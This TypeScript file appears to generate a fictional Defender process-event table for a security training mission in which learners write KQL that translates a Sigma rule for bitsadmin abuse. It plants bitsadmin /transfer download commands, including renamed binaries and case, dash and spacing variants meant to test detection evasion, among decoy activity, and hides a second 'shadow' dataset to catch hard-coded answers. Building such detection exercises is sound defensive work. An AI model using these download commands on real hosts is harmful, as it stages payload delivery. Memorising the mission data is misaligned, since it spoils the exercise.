/**
 * Room 107 "Operation Rule and Sign" (Pelham Instruments): the Defender for
 * Endpoint process table the learner queries in the boss mission, to run the
 * bitsadmin Sigma rule as hand-written KQL. Native DeviceProcessEvents column
 * names; FolderPath is the full image path, as Defender records it. Fictional
 * values only (pelham.example, RFC 5737 addresses).
 *
 * Two copies from one generator: VISIBLE and SHADOW (other hosts, accounts,
 * renamed copies, job names, servers and ReportIds, and one more delivery).
 * A query that translates the rule passes both; one that lists the visible
 * ReportIds fails the shadow.
 *
 * Planted (visible): seven download jobs, the same kinds the Sigma rule must
 * catch: /transfer, /TRANSFER, -transfer, extra spaces, an en dash, and two
 * renamed copies whose ProcessVersionInfoOriginalFileName still reads
 * bitsadmin.exe. Decoys: bitsadmin /list, /info, /reset and /monitor, the BITS
 * service under svchost.exe, and PowerShell's Start-BitsTransfer from the
 * internal firmware server.
 */
import type { MissionDataset, MissionTable } from "../types";

const NOW = "2026-11-09T18:00:00Z";
const DAY = "2026-11-09";
const SYS = "C:\\Windows\\System32";
const BITS = `${SYS}\\bitsadmin.exe`;

function rng(seed: number) {
  let a = seed >>> 0;
  return () => {
    a = (a + 0x6d2b79f5) >>> 0;
    let t = a;
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}

interface Job { host: string; user: string; path: string; cmd: string; parent: string; hh: number; mm: number }

interface Cast {
  seed: number;
  hosts: string[];
  users: string[];
  admin: string;
  itHost: string;
  jobs: Job[];
}

const at = (hh: number, mm: number, ss: number) => `${DAY}T${String(hh).padStart(2, "0")}:${String(mm).padStart(2, "0")}:${String(ss).padStart(2, "0")}Z`;

const VISIBLE: Cast = {
  seed: 10707,
  hosts: ["PEL-BLD-03", "PEL-BLD-04", "PEL-QA-07", "PEL-ENG-22", "PEL-ENG-31", "PEL-ENG-12", "PEL-IT-02", "PEL-LAB-05"],
  users: ["svc_build", "qa.runner", "r.adebayo", "m.lindgren", "s.chaudhry", "e.novak", "l.ferraro"],
  admin: "adm.kreyes", itHost: "PEL-IT-02",
  jobs: [
    { host: "PEL-BLD-03", user: "svc_build", path: BITS, parent: "cmd.exe", hh: 2, mm: 11, cmd: "bitsadmin /transfer upd /download /priority high http://198.51.100.58/c.bin C:\\ProgramData\\Pelham\\calhelper.exe" },
    { host: "PEL-QA-07", user: "qa.runner", path: BITS, parent: "wscript.exe", hh: 7, mm: 40, cmd: "bitsadmin /TRANSFER pcal /download http://203.0.113.58/u/pcal.dat C:\\Users\\Public\\pcal.dat" },
    { host: "PEL-ENG-22", user: "r.adebayo", path: BITS, parent: "powershell.exe", hh: 9, mm: 26, cmd: "bitsadmin.exe -transfer job1 http://198.51.100.58/c.bin C:\\Users\\r.adebayo\\AppData\\Local\\Temp\\c.bin" },
    { host: "PEL-BLD-03", user: "svc_build", path: "C:\\ProgramData\\Pelham\\bts.exe", parent: "cmd.exe", hh: 11, mm: 47, cmd: "bts.exe /transfer x /download http://198.51.100.58/c2.bin C:\\ProgramData\\Pelham\\c2.bin" },
    { host: "PEL-ENG-31", user: "m.lindgren", path: BITS, parent: "cmd.exe", hh: 13, mm: 5, cmd: "bitsadmin /Transfer   upd2  /download http://203.0.113.58/c2.bin C:\\ProgramData\\c2.bin" },
    { host: "PEL-QA-07", user: "qa.runner", path: BITS, parent: "wscript.exe", hh: 13, mm: 41, cmd: "bitsadmin \u2013transfer upd /download http://198.51.100.58/c.bin C:\\Users\\Public\\c.bin" },
    { host: "PEL-ENG-22", user: "r.adebayo", path: "C:\\Users\\Public\\svcupd.exe", parent: "cmd.exe", hh: 14, mm: 12, cmd: "svcupd.exe /transfer j /download /priority foreground http://203.0.113.58/c.bin C:\\Users\\Public\\c.bin" },
  ],
};

const SHADOW: Cast = {
  seed: 70107,
  hosts: ["PEL-BLD-05", "PEL-BLD-01", "PEL-QA-02", "PEL-ENG-14", "PEL-ENG-09", "PEL-ENG-40", "PEL-IT-06", "PEL-LAB-02"],
  users: ["svc_ci", "qa.bot", "t.nakamura", "j.okoro", "p.vance", "h.ibsen", "c.duarte"],
  admin: "adm.mwangi", itHost: "PEL-IT-06",
  jobs: [
    { host: "PEL-BLD-05", user: "svc_ci", path: BITS, parent: "cmd.exe", hh: 1, mm: 52, cmd: "bitsadmin /transfer sync /download /priority high http://203.0.113.140/a.bin C:\\ProgramData\\PelCI\\calhelper.exe" },
    { host: "PEL-QA-02", user: "qa.bot", path: BITS, parent: "wscript.exe", hh: 6, mm: 18, cmd: "bitsadmin -TRANSFER q /download http://198.51.100.200/q.dat C:\\Users\\Public\\q.dat" },
    { host: "PEL-ENG-14", user: "t.nakamura", path: "C:\\Users\\Public\\msupd.exe", parent: "cmd.exe", hh: 8, mm: 3, cmd: "msupd.exe /transfer m /download http://203.0.113.140/m.bin C:\\Users\\Public\\m.bin" },
    { host: "PEL-ENG-09", user: "j.okoro", path: BITS, parent: "powershell.exe", hh: 10, mm: 37, cmd: "bitsadmin   /transfer   j2 http://198.51.100.200/j2.bin C:\\Users\\j.okoro\\AppData\\Local\\Temp\\j2.bin" },
    { host: "PEL-BLD-05", user: "svc_ci", path: "C:\\ProgramData\\PelCI\\bthelper.exe", parent: "cmd.exe", hh: 12, mm: 9, cmd: "bthelper.exe -transfer b /download http://203.0.113.140/b.bin C:\\ProgramData\\PelCI\\b.bin" },
    { host: "PEL-QA-02", user: "qa.bot", path: BITS, parent: "wscript.exe", hh: 15, mm: 44, cmd: "bitsadmin \u2013Transfer z /download http://198.51.100.200/z.bin C:\\Users\\Public\\z.bin" },
    { host: "PEL-ENG-40", user: "p.vance", path: BITS, parent: "cmd.exe", hh: 16, mm: 2, cmd: "bitsadmin.exe /transfer w /download /priority normal http://203.0.113.140/w.bin C:\\ProgramData\\w.bin" },
    { host: "PEL-ENG-09", user: "j.okoro", path: BITS, parent: "powershell.exe", hh: 16, mm: 30, cmd: "bitsadmin /TrAnSfEr v /download http://198.51.100.200/v.bin C:\\Users\\Public\\v.bin" },
  ],
};

/** Ordinary process starts on build, engineering, QA and lab hosts: [file, folder, command line, parent]. */
const NORMAL: [string, string, string, string][] = [
  ["MSBuild.exe", "C:\\Program Files\\Microsoft Visual Studio\\2022\\BuildTools\\MSBuild\\Current\\Bin\\amd64", "MSBuild.exe Pelham.Firmware.sln /t:Build /p:Configuration=Release", "cmd.exe"],
  ["git.exe", "C:\\Program Files\\Git\\cmd", "git.exe fetch --prune origin", "cmd.exe"],
  ["cl.exe", "C:\\Program Files\\Microsoft Visual Studio\\2022\\BuildTools\\VC\\Tools\\MSVC\\14.41.34120\\bin\\Hostx64\\x64", "cl.exe /c /O2 /W4 scale_ctl.c", "MSBuild.exe"],
  ["signtool.exe", "C:\\Program Files (x86)\\Windows Kits\\10\\bin\\10.0.22621.0\\x64", "signtool.exe verify /pa /v out\\fw_2611.bin.cab", "cmd.exe"],
  ["msedge.exe", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application", "\"msedge.exe\" --type=renderer --lang=en-GB", "msedge.exe"],
  ["OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16", "\"OUTLOOK.EXE\"", "explorer.exe"],
  ["svchost.exe", SYS, "svchost.exe -k netsvcs -p -s Schedule", "services.exe"],
  ["conhost.exe", SYS, "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", "cmd.exe"],
  ["python.exe", "C:\\Program Files\\Python312", "python.exe tools\\pack_firmware.py --target fw_2611", "cmd.exe"],
  ["curl.exe", SYS, "curl.exe -s -o build\\deps.zip http://artifacts.pelham.example/deps/2611.zip", "cmd.exe"],
  ["PelhamLabelPrint.exe", "C:\\Program Files\\Pelham\\LabelPrint", "PelhamLabelPrint.exe /service", "services.exe"],
  ["ms-teams.exe", "C:\\Program Files\\WindowsApps\\MSTeams_24295.605.3225.8804_x64__8wekyb3d8bbwe", "\"ms-teams.exe\" msteams:system-initiated", "explorer.exe"],
];

function hex(r: () => number, n: number): string {
  let s = "";
  for (let i = 0; i < n; i++) s += Math.floor(r() * 16).toString(16);
  return s;
}

function processEvents(c: Cast): Record<string, unknown>[] {
  const r = rng(c.seed);
  const ids = new Set<number>();
  const reportId = () => { let id: number; do id = 1000 + Math.floor(r() * 899000); while (ids.has(id)); ids.add(id); return id; };
  const deviceIds = new Map<string, string>();
  const deviceId = (h: string) => { if (!deviceIds.has(h)) deviceIds.set(h, hex(r, 40)); return deviceIds.get(h)!; };
  const row = (time: string, host: string, account: string, fullPath: string, cmd: string, parent: string, original?: string) => {
    const file = fullPath.slice(fullPath.lastIndexOf("\\") + 1);
    return {
      Timestamp: time, DeviceId: deviceId(host), DeviceName: `${host.toLowerCase()}.pelham.example`, ActionType: "ProcessCreated",
      FileName: file, FolderPath: fullPath, ProcessCommandLine: cmd, ProcessVersionInfoOriginalFileName: original ?? file,
      AccountDomain: account.startsWith("NT AUTHORITY") ? "nt authority" : "pelham", AccountName: account.startsWith("NT AUTHORITY") ? "system" : account,
      InitiatingProcessFileName: parent, SHA256: hex(r, 64), ProcessId: 1000 + Math.floor(r() * 9000), ReportId: reportId(),
    };
  };
  const out: Record<string, unknown>[] = [];
  for (let i = 0; i < 260; i++) {
    const host = c.hosts[Math.floor(r() * c.hosts.length)];
    const [file, folder, cmd, parent] = NORMAL[Math.floor(r() * NORMAL.length)];
    const who = file === "svchost.exe" || parent === "services.exe" ? "NT AUTHORITY\\SYSTEM" : c.users[Math.floor(r() * c.users.length)];
    out.push(row(at(Math.floor(r() * 18), Math.floor(r() * 60), Math.floor(r() * 60)), host, who, `${folder}\\${file}`, cmd, parent));
  }
  // Decoys: the admin's own bitsadmin work, the BITS service, PowerShell's BITS cmdlet.
  out.push(row(at(7, 2, 15), c.itHost, c.admin, BITS, "bitsadmin /list /allusers", "cmd.exe"));
  out.push(row(at(8, 14, 56), c.itHost, c.admin, BITS, "bitsadmin /info \"Pelham Firmware Sync\" /verbose", "cmd.exe"));
  out.push(row(at(12, 30, 44), c.itHost, c.admin, BITS, "bitsadmin /reset /allusers", "cmd.exe"));
  out.push(row(at(16, 5, 9), c.itHost, c.admin, BITS, "bitsadmin /monitor /allusers /refresh 5", "cmd.exe"));
  for (const h of c.hosts.slice(0, 3)) out.push(row(at(8, 0, 31), h, "NT AUTHORITY\\SYSTEM", `${SYS}\\svchost.exe`, `${SYS}\\svchost.exe -k netsvcs -p -s BITS`, "services.exe"));
  out.push(row(at(10, 3, 12), c.hosts[4], c.users[3], `${SYS}\\WindowsPowerShell\\v1.0\\powershell.exe`,
    "powershell.exe -NoProfile -Command Start-BitsTransfer -Source http://fw.pelham.example/fw/2611.bin -Destination D:\\fw\\2611.bin", "explorer.exe", "PowerShell.EXE"));
  // The deliveries.
  c.jobs.forEach((j, i) => out.push(row(at(j.hh, j.mm, 3 + i * 7), j.host, j.user, j.path, j.cmd, j.parent, "bitsadmin.exe")));
  return out.sort((a, b) => String(a.Timestamp).localeCompare(String(b.Timestamp)));
}

const COLUMNS: MissionTable["columns"] = [
  { name: "Timestamp", type: "datetime" }, { name: "DeviceId", type: "string" }, { name: "DeviceName", type: "string" },
  { name: "ActionType", type: "string" }, { name: "FileName", type: "string" }, { name: "FolderPath", type: "string" },
  { name: "ProcessCommandLine", type: "string" }, { name: "ProcessVersionInfoOriginalFileName", type: "string" },
  { name: "AccountDomain", type: "string" }, { name: "AccountName", type: "string" }, { name: "InitiatingProcessFileName", type: "string" },
  { name: "SHA256", type: "string" }, { name: "ProcessId", type: "long" }, { name: "ReportId", type: "long" },
];

function build(c: Cast): MissionDataset {
  return { now: NOW, tables: [{ name: "DeviceProcessEvents", columns: COLUMNS, rows: processEvents(c) }] };
}

export const RULE_AND_SIGN = { visible: () => build(VISIBLE), shadow: () => build(SHADOW) };
